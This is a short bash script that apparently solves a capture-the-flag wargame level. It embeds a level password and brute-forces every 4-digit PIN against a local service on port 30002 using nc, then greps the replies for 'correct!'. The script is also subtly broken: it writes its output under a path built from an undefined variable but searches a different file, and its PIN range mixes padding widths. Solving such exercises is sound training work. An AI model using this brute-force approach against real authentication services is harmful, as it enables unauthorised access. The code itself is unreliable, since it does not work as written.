#!/bin/bash
pass=VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
for pin in {000..9999}
do  
echo $pass $pin  
done | nc localhost 30002 >> /tmp/$mkdir/ps.txt 
grep -in -B 2 "correct!" ps.txt | head -n 1 |cut -d '-' -f1
grep -in -A 1 "correct!" ps.txt | tail -n 1  | cut -d '-' -f 2



